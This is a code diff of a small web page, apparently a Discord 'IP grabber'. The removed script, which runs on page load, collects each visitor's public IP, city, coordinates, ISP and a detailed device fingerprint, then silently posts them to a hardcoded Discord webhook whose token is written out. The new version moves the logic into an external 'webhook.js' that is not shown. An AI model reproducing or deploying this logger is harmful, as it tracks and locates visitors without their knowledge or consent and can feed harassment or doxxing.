@@ -3,241 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>User Info Website</title>
+    <title>dc @ahkwrd | open-source</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background: url('wp5345470.png') no-repeat center center fixed;
-            background-size: cover;
             margin: 0;
             padding: 0;
-            color: blue;
-        }
-        header {
-            background-color: rgba(76, 175, 80, 0.5); /* Semi-transparent green */
-            color: white;
-            padding: 20px;
-            text-align: center;
-        }
-        main {
-            padding: 20px;
-            text-align: left;
-            background-color: rgba(255, 255, 255, 0.8);
-            margin: 20px;
-            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('https://i.pinimg.com/originals/44/4b/8f/444b8f406347a470a7de5478206dd158.gif') no-repeat center center fixed;
+            background-size: cover;
+            font-family: Arial, sans-serif;
+            color: #fff;
         }
         #info {
+            text-align: left;
+            max-width: 90%;
+            position: absolute;
+            top: 5%;
+            left: 50%;
+            transform: translate(-50%, 0%);
             white-space: pre-wrap;
-            background-color: rgba(255, 255, 255, 0.8);
-            padding: 20px;
-            margin: 20px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            display: none;
+            word-wrap: break-word;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        @media (max-width: 600px) {
+            #info {
+                font-size: 16px;
+                padding: 10px;
+                top: 10%;
+                max-width: 95%;
+            }
         }
     </style>
 </head>
 <body>
-    <header>
-        <h1>User Information</h1>
-    </header>
-    <main>
-        <div id="info"></div>
-        <audio id="backgroundMusic" src="audio.mp3" loop autoplay></audio>
-    </main>
-    <script>
-        let infoLogged = false;
-
-        async function getUserInfo() {
-            // Get IP address and port info
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const ip = ipData.ip;
-
-            // Mock port as IP APIs generally don't provide port information
-            const port = window.location.port || '80'; // Default to port 80 if no port is specified
-
-            // Get IP details
-            const detailsResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-            const detailsData = await detailsResponse.json();
-
-            // Get PC specs
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const cpuCores = navigator.hardwareConcurrency;
-
-            // Get GPU information
-            let gpuInfo = 'N/A';
-            let gpuVendor = 'N/A';
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                }
-            }
-
-            // Get memory information
-            const memory = navigator.deviceMemory || 'N/A'; // in GB
-
-            // Detect browser name
-            let browserName = 'Unknown';
-            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Safari') > -1) {
-                browserName = 'Google Chrome';
-            } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
-                browserName = 'Safari';
-            } else if (ua.indexOf('Firefox') > -1) {
-                browserName = 'Mozilla Firefox';
-            } else if (ua.indexOf('MSIE') > -1 || ua.indexOf('Trident') > -1) {
-                browserName = 'Internet Explorer';
-            }
-
-            return {
-                ip: ip,
-                port: port,
-                country: detailsData.country_name,
-                region: detailsData.region,
-                city: detailsData.city,
-                zip: detailsData.postal,
-                location: `${detailsData.city}, ${detailsData.region}, ${detailsData.country_name}`,
-                latitude: detailsData.latitude,
-                longitude: detailsData.longitude,
-                timezone: detailsData.timezone,
-                currentTime: new Date().toLocaleString(),
-                isp: detailsData.org,
-                organization: detailsData.org,
-                autonomousSystem: detailsData.asn,
-                browserName: browserName,
-                platformName: platform,
-                browserVersion: ua.match(/Chrome\/([0-9.]+)/)[1],
-                mobile: /Mobi|Android/i.test(navigator.userAgent),
-                referrer: document.referrer || 'None',
-                languages: navigator.languages.join(', '),
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                windowWidth: window.innerWidth,
-                windowHeight: window.innerHeight,
-                pixelDepth: screen.pixelDepth,
-                orientation: screen.orientation.type,
-                rotation: screen.orientation.angle,
-                cpuCores: cpuCores,
-                memory: memory,
-                gpu: `${gpuVendor} (${gpuInfo})`,
-            };
-        }
-
-        function typeWriter(element, text, i = 0) {
-            if (i < text.length) {
-                element.innerHTML = text.substring(0, i + 1);
-                i++;
-                setTimeout(() => typeWriter(element, text, i), 50);
-            }
-        }
-
-        async function sendToDiscord(info) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1268114825800847444/tkSkyENJBC6F8gcXJroOcgjKnB7ReF2kcJPmw99HYNhCN13PK_EPDLyAKPdkA0ZsBo-F';
-            const message = {
-                content: `User Information:\n
-                IP Address: ${info.ip}:${info.port}
-                Country: ${info.country}
-                Region: ${info.region}
-                City: ${info.city}
-                ZIP Code: ${info.zip}
-                Full Location: ${info.location}
-                Latitude: ${info.latitude}
-                Longitude: ${info.longitude}
-                Timezone: ${info.timezone}
-                Current Time: ${info.currentTime}
-                ISP: ${info.isp}
-                Organization: ${info.organization}
-                Autonomous System: ${info.autonomousSystem}
-                Browser Name: ${info.browserName}
-                Platform Name: ${info.platformName}
-                Browser Version: ${info.browserVersion}
-                Mobile/Tablet: ${info.mobile ? 'Yes' : 'No'}
-                Referrer: ${info.referrer}
-                System Languages: ${info.languages}
-                Screen Width: ${info.screenWidth}
-                Screen Height: ${info.screenHeight}
-                Window Width: ${info.windowWidth}
-                Window Height: ${info.windowHeight}
-                Display Pixel Depth: ${info.pixelDepth}
-                Screen Orientation: ${info.orientation}
-                Screen Rotation: ${info.rotation}
-                CPU Threads: ${info.cpuCores}
-                Available Browser Memory: ${info.memory * 1024} MB
-                GPU Vendor: ${info.gpuVendor}
-                GPU Info: ${info.gpu}`
-            };
-            
-            await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message),
-            });
-        }
-
-        function showInfo() {
-            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-
-            getUserInfo().then(info => {
-                if (!infoLogged) {
-                    const infoDiv = document.getElementById('info');
-                    const text = `
-IP Address: ${info.ip}:${info.port}
-Country: ${info.country}
-Region: ${info.region}
-City: ${info.city}
-ZIP Code: ${info.zip}
-Full Location: ${info.location}
-Latitude: ${info.latitude}
-Longitude: ${info.longitude}
-Timezone: ${info.timezone}
-Current Time: ${info.currentTime}
-ISP: ${info.isp}
-Organization: ${info.organization}
-Autonomous System: ${info.autonomousSystem}
-Browser Name: ${info.browserName}
-Platform Name: ${info.platformName}
-Browser Version: ${info.browserVersion}
-Mobile/Tablet: ${info.mobile ? 'Yes' : 'No'}
-Referrer: ${info.referrer}
-System Languages: ${info.languages}
-Screen Width: ${info.screenWidth}
-Screen Height: ${info.screenHeight}
-Window Width: ${info.windowWidth}
-Window Height: ${info.windowHeight}
-Display Pixel Depth: ${info.pixelDepth}
-Screen Orientation: ${info.orientation}
-Screen Rotation: ${info.rotation}
-CPU Threads: ${info.cpuCores}
-Available Browser Memory: ${info.memory * 1024} MB
-GPU Vendor: ${info.gpuVendor}
-GPU Info: ${info.gpu}
-                    `;
-                    infoDiv.style.display = 'block';
-                    typeWriter(infoDiv, text);
-                    sendToDiscord(info); // Send info to Discord
-                    infoLogged = true;
-                }
-            });
-        }
-
-        // Automatically show info on page load
-        window.onload = showInfo;
-
-        // Autoplay audio
-        document.addEventListener('DOMContentLoaded', () => {
-            const audioElement = document.getElementById('backgroundMusic');
-            audioElement.play().catch(() => {
-                console.log("Audio playback was prevented.");
-            });
-        });
-    </script>
+    <div id="info"></div>
+    <audio id="backgroundMusic" loop>
+        <source src="https://swatcity.lol/c.mp3" type="audio/mp3">
+    </audio>
+    <script src="webhook.js"></script>
 </body>
 </html>
